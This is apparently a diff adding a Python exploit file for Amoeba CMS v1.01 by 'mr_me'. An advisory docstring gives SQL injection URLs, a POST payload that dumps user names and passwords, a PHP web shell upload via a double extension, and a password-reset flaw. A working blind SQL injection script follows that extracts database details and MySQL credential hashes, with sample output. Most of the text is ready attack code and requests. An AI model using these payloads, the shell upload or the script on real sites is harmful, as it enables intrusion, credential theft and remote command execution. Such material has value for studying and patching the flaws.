@@ -1,0 +1,285 @@
+#!/usr/bin/python
+
+"""
+Amoeba CMS v1.01 multiple remote vulnerabilities:
+Vendor: http://www.amoebacms.com/
+Found by: mr_me
+Contact date: 20/12/2010 2:37pm EST
+
+SQL Injection:
+=============
+There is quite a few instances of pre/post auth SQL Injection in the web application. In one particular SQLi the attacker 
+controlled input is being used for multiple queries, and as such seems to fail on the second query when using the _ character. 
+This character is used as a wildcard in the second query as per the MySql manual. Therefore stealing data from the 'amb_users'
+table may prove difficult. Additionaly, order by SQL Injection is present, which doubles the fun :0)
+
+Pre-auth SQL Injection PoC (refer below to an automated working PoC):
+---------------------------------------------------------------------
+http://[target]/[path]/index.php?mod=cat&com=news&cpID=1+or+1=1 << true
+http://[target]/[path]/index.php?mod=cat&com=news&cpID=1+or+1=2 << false
+
+Post-auth SQL Injection PoCs:
+-----------------------------
+These will require the attacker to obtain access to the backend somehow. 
+Only one cookie is needed to reach this backend (ambid).
+
+PoC 1:
+------
+POST /[PATH]/admin/index.php?mod=group&com=menu HTTP/1.1
+Host: [target]
+User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.13) Gecko/20101209 Fedora/3.6.13-1.fc13 Firefox/3.6.13
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 115
+Proxy-Connection: keep-alive
+Cookie: ambid=5i5nrbl5d09f3ktqkh7sfe1s94
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 39
+
+pageingsize=1+uNiOn+sEleCt+1,coNcAt(user_name,0x3a,users_password),3+from+amb_users--
+
+PoC 2:
+------
+http://[target]/[path]/admin/index.php?mod=cat&com=gallery&cpID=1+or+1=1 << true
+http://[target]/[path]/admin/index.php?mod=cat&com=gallery&cpID=1+or+1=2 << false
+
+Shell Upload Vulnerability:
+==========================
+Interestingly enough, this application uses a whitelist extension approach which is stored in the database (amb_media_type)! 
+Unfortunately/fortunately they still allow a '.whateva' extension in the filename, as long as it doesnt end in an extension 
+that is not on the whitelist. As a fatality the attacker can upload content with 'malicious' code inside and 'get a shell' 
+by using an Apache AddType directive. Once the request is made, the application will re-write the file to the original/ dir
+using the php time() added into its name. See below:
+
+PoC:
+----
+POST /webapps/amoeba2/admin/index.php?mod=manip&com=media&mediaType=IMAGE&name=lol.php.jpg HTTP/1.1
+Host: [target]
+User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.13) Gecko/20101209 Fedora/3.6.13-1.fc13 Firefox/3.6.13
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 115
+Proxy-Connection: keep-alive
+Cookie: ambid=5pk8u31pobv3qr0tci03o7tog5
+Content-Type: application/octet-stream
+Content-Length: 31
+
+<?PHP system($_GET['cmd']); ?>
+
+Server Response:
+----------------
+{"jsonrpc" : "2.0", "result" : null, "chunk" : "0", "chunks" : "0", "name" : "lol.php-1293423431.jpg", "id" : "id"}
+
+Then we can access our shell at:
+http://[target]/[path]/media/original/lol.php-1293423431.jpg?cmd=id 
+
+Logic Flaws:
+===========
+Password disclosure & password reset:
+--------------------
+Password hash disclosure in the admin console. Just change uID to whateva your current uID once you have stolen the admin cookie.
+Additionaly you can reset the admins password, without actually knowing the password. o_O Suprise surpise, its the same link:
+
+PoC:
+---
+http://[target]/[path]/admin/index.php?mod=list&com=user&uID=2&action=edit
+
+"""
+
+# Amoeba CMS v1.0.1 Remote Blind SQL Injection Exploit
+# ----------------------------------------------->
+# Script provided 'as is', without any warranty.
+# Use for educational purposes only.
+# Do not use this code to do anything illegal !
+# ----------------------------------------------->
+# 8 queries per char, much much cleaner.
+#
+# [mr_me@pluto amoeba]$ python amoeba0day.py -p 127.0.0.1:8080 -s 'whateva' -t 192.168.1.15 -d /webapps/amoeba2/
+# 
+#	| --------------------------------------------- |
+#	| Amoeba CMS Remote Blind SQL Injection Exploit |
+#	| by mr_me - net-ninja.net -------------------- |
+#
+# (+) Exploiting target @: http://192.168.1.15/webapps/amoeba2/
+# (+) Testing Proxy @ 127.0.0.1:8080..
+# (+) Proxy is working!
+# (+) Using string 'whateva' for the true page
+# (+) This will take time, go grab a coffee..
+#
+# (!) Getting database version: 5.1.41-3ubuntu12.8
+# (!) Getting database user: root@localhost
+# (!) Getting database name: amoeba2
+# (!) w00t! You have access to MySQL database!
+# (+) Dumping hashs hold onto your knickers..
+# (+) The username and hashed password is: root:*EE4E2773D7530819563F0DC6FCE27446A51C9413
+# (+) PoC finished.
+
+import sys, urllib, re
+from optparse import OptionParser
+
+# all possible decimal values of printable ascii characters
+# 8 requests per char, much much cleaner.
+lower_value = 0
+upper_value = 126
+
+vuluri = "index.php?mod=cat&com=news&cpID=1"
+basicInfo = {'version':'version()', 'user':'user()', 'name':'database()'}
+
+usage = "./%prog [<options>] -s [true string] -t [target] -d [directory]"
+usage += "\nExample: ./%prog -p localhost:8080 -s 'Author:' -t 192.168.2.15 -d /amoeba/"
+
+parser = OptionParser(usage=usage)
+parser.add_option("-p", type="string",action="store", dest="proxy",
+                  help="HTTP Proxy <server:port>")
+parser.add_option("-t", type="string", action="store", dest="target",
+                  help="The Target server <server:port>")
+parser.add_option("-d", type="string", action="store", dest="directory",
+                  help="Directory path to the CMS")
+parser.add_option("-s", type="string", action="store", dest="trueStr",
+                  help="String that is on the 'true' page (used with the -b option)")
+
+(options, args) = parser.parse_args()
+
+def banner():
+    print "\n\t| --------------------------------------------- |"
+    print "\t| Amoeba CMS Remote Blind SQL Injection Exploit |"
+    print "\t| by mr_me - net-ninja.net -------------------- |\n"
+
+if len(sys.argv) < 5:
+	banner()
+	parser.print_help()
+	sys.exit(1)
+
+def setTargetHTTP():
+	if options.target[0:7] != 'http://':
+		options.target = "http://" + options.target
+	return options.target
+	
+def getProxy():
+	try:
+		proxy = {'http': "http://"+options.proxy}
+		opener = urllib.FancyURLopener(proxy)
+	except(socket.timeout):
+		print "\n(-) Proxy Timed Out"
+		sys.exit(1)
+	except(),msg:
+		print "\n(-) Proxy Failed"
+		sys.exit(1)
+	return opener
+	
+def getServerResponse(exploit):
+	if options.proxy:
+		try:
+			options.target = setTargetHTTP()
+			opener = getProxy()
+			check = opener.open(options.target+options.directory+exploit).read()
+		except urllib.error.HTTPError, error:
+			check = error.read()
+		except socket.error:
+			print "(-) Proxy connection failed"
+			sys.exit(1)
+	else:
+		try:
+			check = urllib.urlopen(options.target+options.directory+exploit).read()
+		except urllib.error.HTTPError, error:
+			check = error.read()
+		except urllib.error.URLError:
+			print "(-) Target connection failed, check your address"
+			sys.exit(1)
+	return check
+
+# modified version of rsauron's function 
+# thanks bro. 
+def getAsciiValue(URI):
+	lower = lower_value
+        upper = upper_value
+	while lower < upper:
+		try:
+			mid = (lower + upper) / 2
+			head_URI = URI + ">"+str(mid)
+			result = getServerResponse(head_URI)
+			match = re.findall(options.trueStr,result)
+			if len(match) >= 1:
+                                lower = mid + 1
+			else:
+                             	upper = mid
+		except (KeyboardInterrupt, SystemExit):
+                        raise
+                except:
+                       	pass
+
+	if lower > lower_value and lower < upper_value:
+                value = lower
+        else:
+             	head_URI = URI + "="+str(lower)
+		result = getServerResponse(head_URI)
+                match = re.findall(options.trueStr,result)
+                if len(match) >= 1:
+                        value = lower
+                else:
+                        print "(-) READ xprog's blind sql tutorial!\n"
+                        sys.exit(1)
+        return value
+
+def doBlindSqlInjection():
+	print "(+) Using string '%s' for the true page" % (options.trueStr)
+        print "(+) This will take time, go grab a coffee.."
+        for key in basicInfo:
+	        sys.stdout.write("\n(!) Getting database %s: " % (key))
+                sys.stdout.flush()
+
+                # it will never go through all 100 iterations
+                for i in range(1,100):
+                        request = (vuluri+"+or+ascii(substring(%s,%s,1))" % (basicInfo[key],str(i)))
+           		asciival = getAsciiValue(request)
+                        if asciival != 0:
+                                sys.stdout.write("%s" % (chr(asciival)))
+                                sys.stdout.flush()
+                        else:
+                             	break
+	
+	isMysqlUser = (vuluri+"+or+(select 1 from mysql.user limit 0,1)=1")
+        result = getServerResponse(isMysqlUser)
+        match = re.findall(options.trueStr,result)
+        if len(match) >= 1:
+               	print "\n(!) w00t! You have access to MySQL database!"
+                print "(+) Dumping hashs hold onto your knickers.."
+                sys.stdout.write("(+) The username and hashed password is: ")
+                sys.stdout.flush()
+                for k in range(1,100):
+                       	getMysqlUserAndPass = (vuluri+"+or+ascii(substring((SELECT+concat(user,0x3a,password)+from+"
+                        "mysql.user+limit+0,1),%s,1))" % str(k))
+                        asciival = getAsciiValue(getMysqlUserAndPass)
+                        if asciival != 0:
+                                sys.stdout.write("%s" % (chr(asciival)))
+                               	sys.stdout.flush()
+                        else:
+                                break
+        else:
+                print "\n(-) You do not have access to MySQL database"
+
+if __name__ == "__main__":
+	banner()
+	options.target = setTargetHTTP()
+	print "(+) Exploiting target @: %s" % (options.target+options.directory)
+	if options.proxy:
+		print "(+) Testing Proxy @ %s.." % (options.proxy)
+		opener = getProxy()
+		try:
+			check = opener.open("http://www.google.com").read()
+		except:
+			check = 0
+			pass
+		if check >= 1:
+			print "(+) Proxy is working!"
+		
+		else:
+			print "(-) Proxy failed, exiting.."
+			sys.exit(1)
+
+	doBlindSqlInjection()	
+	print "\n(+) PoC finished."
